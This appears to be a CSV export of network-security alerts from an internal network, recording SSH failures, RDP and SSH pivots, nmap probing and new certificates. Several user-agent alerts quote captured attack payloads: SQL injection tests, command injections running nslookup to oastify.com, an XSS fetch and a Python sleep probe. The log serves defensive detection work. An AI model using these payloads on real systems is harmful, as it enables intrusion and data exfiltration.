SEVERITY,ID,OCCURRED_AT,TYPE,DETECTION_QUADS,SUMMARY,CONTENT,DETECTION,ASSET_IDS,SOURCE_HOST_NAME,DESTINATION_HOST_NAME,SOURCE_IP,DESTINATION_IP,OTHER_IP,SOURCE,PACKET_CAPTURE_STATE
Low,30298,2025-03-28T09:39:45Z,Communication,Indicator,External IP Lookup Service Query,ET INFO External IP Lookup Domain in DNS Lookup (whatismyipaddress .com) from host 10.0.5.30 (1936) to 8.8.8.8:53 (69).,External IP Lookup Service Query,"69,1936",,,10.0.5.30,8.8.8.8,,cfb3e2a9-0160-40f5-85a1-31566b30a244,
Low,30300,2025-03-28T09:39:45Z,Communication,Indicator,External IP Lookup Service Query,ET INFO External IP Lookup Domain in DNS Lookup (whatismyipaddress .com) from host 10.0.5.30 (1936) to 8.8.8.8:53 (69).,External IP Lookup Service Query,"69,1936",,,10.0.5.30,8.8.8.8,,5c38c43b-c174-49eb-8a61-9c7040f5fce4,
Low,30302,2025-03-28T09:39:45Z,Communication,Indicator,External IP Lookup Service Query,ET POLICY Known External IP Lookup Service Domain in SNI from host 10.0.5.30 (1936) to 104.19.223.79:443 (nan).,External IP Lookup Service Query,1936,,,10.0.5.30,,,858f519c-c19b-4004-b7b8-25898838dd75,
Low,30303,2025-03-28T09:39:44Z,Communication,Indicator,External IP Lookup Service Query,ET INFO External IP Lookup Domain in DNS Lookup (whatismyipaddress .com) from host 10.0.5.30 (1936) to 8.8.8.8:53 (69).,External IP Lookup Service Query,"69,1936",,,10.0.5.30,8.8.8.8,,d0586d08-c153-4dbd-b330-1d062b2c4dce,
Low,30304,2025-03-28T09:39:45Z,Communication,Indicator,External IP Lookup Service Query,ET INFO External IP Lookup Domain in DNS Lookup (whatismyipaddress .com) from host 10.0.5.30 (1936) to 8.8.8.8:53 (69).,External IP Lookup Service Query,"69,1936",,,10.0.5.30,8.8.8.8,,c2fd31af-d33e-4d3c-bbc9-871122bad39a,
Low,30307,2025-03-28T09:37:40Z,Communication,Configuration,Detected 8 RDP New Comms between 2025-03-28T09:32:25.673Z and 2025-03-28T09:37:40.691Z,"Sample RDP New Comms values include:
  rdp_client_name: ;
  dst__port: ('',);
  ip_src: 10.0.7.30, 10.0.5.11, 10.0.1.29, 10.0.10.30, 10.0.10.29, 10.0.7.44, 10.0.5.30, 10.0.5.12;
  dst_asset_id: 1697, 1936, 1801, 1919, 1768, 1914, 151;
  rdp_keyboard_layout: ;
  ip_dst: 10.0.7.30, 10.0.10.30, 10.0.1.30, 10.0.10.29, 10.0.7.44, 10.0.5.30, 10.0.5.12;
  rdp_selected_protocol: , hybrid, hybrid_ex;
  src__mac: ;
  dst__mac: ;
  protocol: ;
  src_asset_id: 44, 1699, 1936, 1801, 1919, 1768, 1697, 1914;
  dst__ip: ;
  src__port: ('',);
  rdp_rt_cookie: , nmap, User1, alice;
  src__ip: ;",RDP New Comms Pattern,"1919,151,44,1914,1801,1936,1697,1768,1699",,,"10.0.10.30,10.0.1.29,10.0.7.30,10.0.10.29,10.0.5.30,10.0.5.12,10.0.7.44,10.0.5.11","10.0.10.30,10.0.1.30,10.0.7.30,10.0.10.29,10.0.5.30,10.0.5.12,10.0.7.44",,,
Low,30325,2025-03-28T09:40:40Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.5.30 to 10.0.5.11.,SSH Authentication Failure,"1936,1699",,,10.0.5.30,10.0.5.11,,ef43eb23-11b4-4fa4-9d85-a3dde54f2982,
Low,30326,2025-03-28T09:40:40Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.5.30 to 10.0.5.11.,SSH Authentication Failure,"1936,1699",,,10.0.5.30,10.0.5.11,,07cb636b-b086-46f1-84ca-7d7be2618e7a,
Low,30327,2025-03-28T09:40:50Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.5.30 to 10.0.5.11.,SSH Authentication Failure,"1936,1699",,,10.0.5.30,10.0.5.11,,14797bff-89c5-49b4-8339-24f1e15aa6b1,
Low,30330,2025-03-28T09:39:10Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.5.30 to 10.0.5.11.,SSH Authentication Failure,"1936,1699",,,10.0.5.30,10.0.5.11,,408e52a8-a986-44b1-9288-15e0da08e011,
Low,30332,2025-03-28T09:39:05Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.5.30.,SSH Authentication Failure,"2896,1936",,,10.0.242.127,10.0.5.30,,0314df9d-e0a6-4030-b4a9-fca855c1a4f3,
Low,30333,2025-03-28T09:35:49Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.5.30 to 10.0.5.12.,SSH Authentication Failure,"1936,1697",,,10.0.5.30,10.0.5.12,,2f99728b-9349-43fd-a575-604164809961,
Low,30350,2025-03-28T08:34:31Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.5.30.,SSH Authentication Failure,"2896,1936",,,10.0.242.127,10.0.5.30,,54bb5670-6638-4887-9784-486f36161e84,
Low,30353,2025-03-28T08:34:01Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.5.30.,SSH Authentication Failure,"2896,1936",,,10.0.242.127,10.0.5.30,,0c66760c-2ba0-4725-90eb-a615a7d09eab,
Low,30407,2025-03-28T09:54:40Z,Communication,Threat Behavior,RDP traffic to Server,Host 10.0.5.11 (1699) (Enterprise Management/Server) received RDP traffic from 10.0.5.30 (1936).,RDP to Enterprise Management Asset,"1936,1699",,,10.0.5.30,10.0.5.11,,fd92cdd7-1fd5-448b-b459-a7c922496cf8,
Low,30409,2025-03-28T09:55:16Z,Communication,Threat Behavior,RDP traffic to Server,Host 10.0.5.12 (1697) (Enterprise Management/Server) received RDP traffic from 10.0.5.30 (1936).,RDP to Enterprise Management Asset,"1936,1697",,,10.0.5.30,10.0.5.12,,b15f3229-7f79-4a99-aada-eefbddbba790,
Low,30410,2025-03-28T09:55:41Z,Communication,Threat Behavior,RDP traffic to Server,Host 10.0.5.29 (1704) (Enterprise Management/Server) received RDP traffic from 10.0.5.30 (1936).,RDP to Enterprise Management Asset,"1936,1704",,,10.0.5.30,10.0.5.29,,7c1a8070-1393-4b95-8e25-b2b5028750be,
Low,31667,2025-03-28T09:10:06Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.5.30 (1936) to host 10.0.5.11 (1699). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid_ex), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1936,1699",,,10.0.5.30,10.0.5.11,,,
Low,31682,2025-03-28T09:16:31Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.5.30 (1936) to host 10.0.5.29 (1704). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid_ex), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1936,1704",,,10.0.5.30,10.0.5.29,,,
Low,31684,2025-03-28T09:16:27Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.5.30 (1936) to host 10.0.5.29 (1704). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1936,1704",,,10.0.5.30,10.0.5.29,,,
Low,31685,2025-03-28T09:16:26Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.5.29 (1704) to host 10.0.5.30 (1936). If unencrypted, may also include the RDP cookie (nmap), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1936,1704",,,10.0.5.29,10.0.5.30,,,
Low,31710,2025-03-28T09:33:47Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.5.30 (1936) to host 10.0.5.12 (1697). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid_ex), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1936,1697",,,10.0.5.30,10.0.5.12,,,
Low,31711,2025-03-28T09:33:47Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.5.12 (1697) to host 10.0.5.30 (1936). If unencrypted, may also include the RDP cookie (nmap), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1936,1697",,,10.0.5.12,10.0.5.30,,,
Low,31712,2025-03-28T09:33:33Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.5.11 (1699) to host 10.0.5.30 (1936). If unencrypted, may also include the RDP cookie (nmap), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1936,1699",,,10.0.5.11,10.0.5.30,,,
Low,32250,2025-03-28T09:47:17Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 1936 (10.0.5.30) connected via SSH to asset 1699 (10.0.5.11) to then pivot to asset 1936 (10.0.5.30) via RDP.,Interactive Session Pivots,1936,,,10.0.5.30,10.0.5.30,,,
Low,32251,2025-03-28T09:53:04Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 1699 (10.0.5.11) connected via RDP to asset 1936 (10.0.5.30) to then pivot to asset 1704 (10.0.5.29) via RDP.,Interactive Session Pivots,"1699,1704",,,10.0.5.11,10.0.5.29,,,
Low,32278,2025-03-28T09:53:14Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.5.30.,SSH Authentication Failure,"2896,1936",,,10.0.242.127,10.0.5.30,,97f49ff0-be80-4b96-8b68-d6fb0fc3a94d,
Low,32293,2025-03-28T09:19:14Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.5.30.,SSH Authentication Failure,"2896,1936",,,10.0.242.127,10.0.5.30,,529216e3-2fe7-4a65-83b0-3799899ca68a,
Low,32318,2025-03-28T09:51:59Z,Communication,Configuration,Detected 159 NewX509Certificate between 2025-03-28T09:38:52.262Z and 2025-03-28T09:51:59.546Z,"Sample NewX509Certificate values include:
  server: 169.150.247.36, 35.214.136.108, 45.137.176.88, 142.250.186.34, 104.18.27.193, 10.0.6.11, 52.210.124.59, 54.246.115.73, 178.250.1.11, 20.189.173.5;
  subject: , C=NO, L=Oslo, O=Opera Norway AS, CN=*.adx.opera.com, C=US, ST=California, L=San Francisco, O=Mozilla Corporation, CN=incoming.telemetry.mozilla.org, CN=DC1.PLUMETECH.LOCAL, CN=FS1.PLUMETECH.LOCAL, C=US, ST=California, L=Los Angeles, O=Magnite, Inc., CN=*.rubiconproject.com, CN=*.adnxs-simple.com, CN=*.adnxs.com, CN=*.tremorhub.com, CN=*.yellowblue.io;
  not_before: , 2024-02-29T00:00:00Z, 2025-02-21T00:00:00Z, 2024-06-23T10:17:34Z, 2025-03-26T02:23:20Z, 2024-05-23T00:00:00Z, 2025-03-04T00:00:00Z, 2024-04-23T12:44:34Z, 2024-05-31T00:00:00Z, 2024-09-29T00:00:00Z;
  server_asset_id: 3680, 3676, 3733, 3702, 3609, 3727, 3707, 1754, 3665, 3750;
  dst__port: ('',);
  dns: ;
  uuid: a1a14540-7106-4701-8338-8b34b48ab06d, 59316db6-f1b0-42f0-acc5-1303a9bf5b47, 016a9776-5e47-438e-882d-73739d046542, d198db01-e208-4b1c-848a-40dbd176eb48, a8161dc4-f92b-459a-ae6e-cc70cf67f8f0, ccf163db-5977-4918-a306-a9b2812d2b26, 7bf004cd-939b-430a-ae69-93ea2d575e68, e596c3e3-9531-4546-bbca-d99be4f6afcc, 4e9b80bd-1d20-499a-a7ce-97f7d6efb99a, 19b37432-32c8-47d1-a3a4-acbcfe7abe38;
  issuer: , C=US, O=DigiCert Inc, CN=DigiCert TLS RSA SHA256 2020 CA1, C=US, O=Amazon, CN=Amazon RSA 2048 M03, CN=FS1.PLUMETECH.LOCAL, C=BE, O=GlobalSign nv-sa, CN=GlobalSign GCC R3 DV TLS CA 2020, C=US, O=DigiCert Inc, CN=DigiCert SHA2 Secure Server CA, C=US, O=Amazon, CN=Amazon RSA 2048 M02, C=US, O=Microsoft Corporation, CN=Microsoft Azure RSA TLS Issuing CA 08, C=US, O=DigiCert Inc, OU=www.digicert.com, CN=GeoTrust ECC CA 2018, C=GB, ST=Greater Manchester, L=Salford, O=Sectigo Limited, CN=Sectigo RSA Domain Validation Secure Server CA;
  client_asset_id: 1905, 1898, 1737, 1910, 1936, 1916, 1746, 44, 151;
  src__mac: ;
  not_after: , 2025-09-16T23:59:59Z, 2025-11-19T23:59:59Z, 2026-03-19T23:59:59Z, 2025-05-15T23:59:59Z, 2026-02-07T23:59:59Z, 2025-06-20T23:59:59Z, 2026-03-27T01:24:33Z, 2025-10-28T23:59:59Z, 2025-07-01T23:59:59Z;
  dst__mac: ;
  protocol: ;
  dst__ip: ;
  client: 10.0.1.29, 10.0.6.29, 10.0.1.30, 10.0.4.30, 10.0.6.30, 10.0.8.30, 10.0.12.29, 10.0.5.30, 10.0.12.30;
  src__port: ('',);
  src__ip: ;",X509 Certificate First Seen,"1916,44,1898,1910,151,1905,1936,1754,3680,3676,3733,3702,3609,3727,3707,3665,3750,1737,1746",,,"10.0.6.11,163.5.194.35,5.135.209.101,13.32.99.104,142.250.186.66,151.101.66.137,104.26.2.70,2.19.198.67,35.214.175.96,52.31.109.203","10.0.8.30,10.0.1.29,10.0.6.30,10.0.12.30,10.0.1.30,10.0.4.30,10.0.5.30,10.0.12.29,10.0.6.29",,"a1a14540-7106-4701-8338-8b34b48ab06d, 59316db6-f1b0-42f0-acc5-1303a9bf5b47, 016a9776-5e47-438e-882d-73739d046542, d198db01-e208-4b1c-848a-40dbd176eb48, a8161dc4-f92b-459a-ae6e-cc70cf67f8f0, ccf163db-5977-4918-a306-a9b2812d2b26, 7bf004cd-939b-430a-ae69-93ea2d575e68, e596c3e3-9531-4546-bbca-d99be4f6afcc, 4e9b80bd-1d20-499a-a7ce-97f7d6efb99a, 19b37432-32c8-47d1-a3a4-acbcfe7abe38",
Low,32346,2025-03-28T10:06:20Z,Indicator,Threat Behavior,SSH Banner Invalid,SSH Banner Invalid,SSH Hunting Signatures,"1936,1697",,,10.0.5.30,10.0.5.12,,Network Traffic,
Low,32567,2025-03-28T10:03:21Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1936 (10.0.5.30) to then pivot to asset 1697 (10.0.5.12) via SSH.,Interactive Session Pivots,"2896,1697",,,10.0.242.127,10.0.5.12,,,
Low,32695,2025-03-28T10:17:27Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1936 (10.0.5.30) to then pivot to asset 1699 (10.0.5.11) via SSH.,Interactive Session Pivots,"2896,1699",,,10.0.242.127,10.0.5.11,,,
Low,32727,2025-03-28T10:28:34Z,Asset,Configuration,Detected 99 NewUserAgent between 2025-03-28T10:11:04.405Z and 2025-03-28T10:28:34.138Z,"Sample NewUserAgent values include:
  dst__port: ('',);
  uuid: d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a;
  src__mac: ;
  src_ip: 10.0.5.29, 10.0.7.30, 10.0.3.29, 10.0.10.30, 10.0.4.30, 10.0.9.12, 10.0.9.29, 10.0.5.30, 10.0.12.30;
  dst__mac: ;
  protocol: ;
  src_asset_id: 1905, 1704, 1709, 1910, 1936, 1919, 1729, 1854, 1914;
  dst__ip: ;
  src__port: ('',);
  user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and '1431'='1437, Microsoft BITS/7.8, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36|nslookup -q=cname whhfxx2jaihwv5vs1umn2di8xz3srjff3aq0ep.oastify.com.&, eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single')), Microsoft-CryptoAPI/10.0, '""><svg/onload=fetch`//ke23ulz776ekstsgyijbz1fwun0go6cy2mx9nxc\.oastify.com`>, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'""`0&nslookup -q=cname hwh0cih4p3whaqadgf18hyxtckie64u1iw5mtb.oastify.com.&`', Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 9194=9196--, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36erros%>j8fd7'/""<ylbim, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 7859=7859--;
  src__ip: ;",User Agent First Seen,"1729,1854,1709,1919,1914,1910,1704,1905,1936",,,,,"10.0.9.29,10.0.9.12,10.0.3.29,10.0.10.30,10.0.7.30,10.0.12.30,10.0.5.29,10.0.4.30,10.0.5.30","d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a",
Low,32730,2025-03-28T10:17:27Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.5.30.,SSH Authentication Failure,"1936,2896",,,10.0.242.127,10.0.5.30,,4fd5c4d7-8e36-446e-8c56-f7be6e3c8469,
Low,32732,2025-03-28T10:28:18Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.5.30 to 10.0.5.11.,SSH Authentication Failure,"1699,1936",,,10.0.5.30,10.0.5.11,,c6ac0a78-3c18-4924-b5ab-42df917094e6,
Low,32774,2025-03-28T10:19:46Z,Communication,Configuration,Detected 93 New Global User Agent between 2025-03-28T10:11:04.405Z and 2025-03-28T10:19:46.276Z,"Sample New Global User Agent values include:
  dst__port: ('',);
  dst_asset_id: 1841, 1697, 1829, 1742;
  uuid: d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a;
  dst_ip: 10.0.12.11, 10.0.5.12, 10.0.7.12, 10.0.4.12;
  src__mac: ;
  src_ip: 10.0.4.30, 10.0.7.30, 10.0.5.30, 10.0.12.30;
  dst__mac: ;
  protocol: ;
  src_asset_id: 1910, 1905, 1914, 1936;
  dst__ip: ;
  host: 10.0.12.11, oastify.com, 10.0.4.12, 10.0.5.12, localhost;
  src__port: ('',);
  user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and '1431'='1437, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36|nslookup -q=cname whhfxx2jaihwv5vs1umn2di8xz3srjff3aq0ep.oastify.com.&, eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single')), '""><svg/onload=fetch`//ke23ulz776ekstsgyijbz1fwun0go6cy2mx9nxc\.oastify.com`>, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'""`0&nslookup -q=cname hwh0cih4p3whaqadgf18hyxtckie64u1iw5mtb.oastify.com.&`', Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 9194=9196--, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36erros%>j8fd7'/""<ylbim, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 7859=7859--, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36|echo cxshsd7ofj sqooozn4bw||a #' |echo cxshsd7ofj sqooozn4bw||a #|"" |echo cxshsd7ofj sqooozn4bw||a #, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3671263895' or '9441'='9442;
  src__ip: ;",User Agent First Seen Globally,"1914,1742,1910,1841,1905,1936,1697,1829",,,"10.0.7.30,10.0.12.30,10.0.4.30,10.0.5.30","10.0.12.11,10.0.7.12,10.0.5.12,10.0.4.12",,"d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a",
Low,32827,2025-03-28T10:40:50Z,Communication,Configuration,Detected 6 NewSMBTraffic between 2025-03-28T10:33:27.605Z and 2025-03-28T10:40:50.630Z,"Sample NewSMBTraffic values include:
  dst__port: ('',);
  dst_asset_id: 1721, 1868, 1919, 1854, 1697, 135;
  uuid: cb825ada-bbcf-4219-ad75-057d7c55e487, acaf527d-4b97-43ad-b4ef-34fbc33e3e77, a6a8c16a-b366-42c3-8bd4-43c3050a4441, bbffa1db-60ab-4510-8b41-a5db113bc83e, 9920da0f-7331-4261-b8a4-db884e05fede, c5dd6e3e-2c81-43f1-87de-c043210a9bd5;
  src__mac: ;
  dst__mac: ;
  log_type: SMB_FileInfo, SMB_TreeInfo;
  protocol: ;
  versions: , SMB2, SMB1;
  src_asset_id: 48, 1910, 1801, 1729, 1933, 1704;
  dst__ip: ;
  src__port: ('',);
  src__ip: ;",New SMB Communication Detection,"48,1910,1801,1729,1933,1704,1721,1868,1919,1854,1697,135",,,"10.0.2.11,10.0.12.30,10.0.10.29,10.0.9.29,10.0.11.30,10.0.5.29","10.0.11.12,10.0.12.12,10.0.10.30,10.0.9.12,10.0.5.12,10.0.2.43",,"cb825ada-bbcf-4219-ad75-057d7c55e487, acaf527d-4b97-43ad-b4ef-34fbc33e3e77, a6a8c16a-b366-42c3-8bd4-43c3050a4441, bbffa1db-60ab-4510-8b41-a5db113bc83e, 9920da0f-7331-4261-b8a4-db884e05fede, c5dd6e3e-2c81-43f1-87de-c043210a9bd5",
Low,32831,2025-03-28T10:37:39Z,Communication,Configuration,Detected 21 NewX509Certificate between 2025-03-28T10:26:38.369Z and 2025-03-28T10:37:39.407Z,"Sample NewX509Certificate values include:
  server: 23.3.89.120, 23.11.206.112, 23.11.206.104, 142.250.185.138, 184.25.50.200, 98.64.238.3, 40.126.31.2, 104.208.16.92, 23.32.238.99, 23.32.238.96;
  subject: , CN=DC1.PLUMETECH.LOCAL, C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=login.live.com;
  not_before: , 2025-03-16T00:00:00Z, 2025-03-27T01:24:33Z;
  server_asset_id: 3811, 1772, 3831, 3825, 3830, 1779, 3817, 3828, 3816, 3785;
  dst__port: ('',);
  dns: ;
  uuid: 460dcfbb-9296-407b-91de-bebe9236da07, 4b8c0dd7-15de-45ea-8cfa-6434c4569602, a653a156-4bbb-4ee1-bfc8-1bb338f138d5, 9b145ab0-7c6b-4522-b651-8d84cf539d10, e95bb3a7-a71f-4baf-b184-2f2916c03438, 3574d92a-fd5d-4f49-8c1d-465a54400b9e, 22f19f9c-ac3e-430d-8548-a10aa1cc7ae7, 05e7b917-662a-4129-b2bd-853486070fc7, e2e2895f-2de6-43ce-86e1-32bde3b5a4dc, d76c2ed4-c426-4225-933f-552b43af9acb;
  issuer: , DC=LOCAL, DC=PLUMETECH, CN=PLUMETECH-DC1-CA, C=US, O=DigiCert Inc, CN=DigiCert SHA2 Secure Server CA;
  client_asset_id: 1905, 48, 1916, 1746, 1729, 1704, 1914;
  src__mac: ;
  not_after: , 2025-09-16T23:59:59Z, 2026-03-27T01:24:33Z;
  dst__mac: ;
  protocol: ;
  dst__ip: ;
  client: 10.0.5.29, 10.0.6.29, 10.0.7.30, 10.0.4.30, 10.0.8.30, 10.0.2.11, 10.0.9.29;
  src__port: ('',);
  src__ip: ;",X509 Certificate First Seen,"1914,1772,48,1729,1704,1916,1905,3831,3830,3825,3828,3811,1779,3817,3816,3785,1746",,,"10.0.7.11,184.25.50.161,20.189.173.24,98.64.238.3,40.90.65.40,23.3.89.120,10.0.8.11,23.11.206.98,184.25.50.200,23.11.206.112","10.0.7.30,10.0.2.11,10.0.9.29,10.0.5.29,10.0.8.30,10.0.4.30,10.0.6.29",,"460dcfbb-9296-407b-91de-bebe9236da07, 4b8c0dd7-15de-45ea-8cfa-6434c4569602, a653a156-4bbb-4ee1-bfc8-1bb338f138d5, 9b145ab0-7c6b-4522-b651-8d84cf539d10, e95bb3a7-a71f-4baf-b184-2f2916c03438, 3574d92a-fd5d-4f49-8c1d-465a54400b9e, 22f19f9c-ac3e-430d-8548-a10aa1cc7ae7, 05e7b917-662a-4129-b2bd-853486070fc7, e2e2895f-2de6-43ce-86e1-32bde3b5a4dc, d76c2ed4-c426-4225-933f-552b43af9acb",
Low,32837,2025-03-28T10:34:46Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.5.30 to 10.0.5.11.,SSH Authentication Failure,"1699,1936",,,10.0.5.30,10.0.5.11,,7738ddf5-5a03-4e04-90cd-4ed8d9633787,
Low,32846,2025-03-28T09:39:32Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.5.30.,SSH Authentication Failure,"2896,1936",,,10.0.242.127,10.0.5.30,,02f7c44b-64cd-4237-aaf3-da397c9e307e,
Low,32848,2025-03-28T09:22:41Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.5.30.,SSH Authentication Failure,"2896,1936",,,10.0.242.127,10.0.5.30,,a6729c0a-7c96-4ffc-9ae5-2a669e09309c,
Low,32912,2025-03-28T10:31:54Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1936 (10.0.5.30) to then pivot to asset 1697 (10.0.5.12) via SSH.,Interactive Session Pivots,"2896,1697",,,10.0.242.127,10.0.5.12,,,
